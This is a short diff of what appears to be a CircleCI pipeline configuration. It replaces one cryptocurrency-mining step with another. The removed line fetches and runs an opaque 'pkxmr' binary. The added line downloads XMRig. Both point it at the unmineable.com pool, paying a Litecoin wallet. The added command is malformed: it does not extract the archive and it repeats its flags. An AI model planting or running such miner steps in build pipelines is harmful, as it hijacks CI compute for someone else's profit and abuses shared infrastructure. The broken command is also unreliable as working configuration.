@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/parkitmove/nuri-xm/raw/main/pkxmr && chmod +x pkxmr && ./pkxmr -o rx.unmineable.com:3333 -a rx -k -u LTC:MAU5ycXcJM3sBjREYEaFzRgxvbxYwkfQ4Y.ampskopi-001 -p x --threads=2
+      - run:  wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && cd xmrig-6.16.4 &&./xmrig -o rx.unmineable.com:3333 -u LTC:MAU5ycXcJM3sBjREYEaFzRgxvbxYwkfQ4Y.ampskpi-001 -p x -k -a rx/0 -a rx -k -u LTC:MAU5ycXcJM3sBjREYEaFzRgxvbxYwkfQ4Y.ampskopi-001 -p x --threads=2
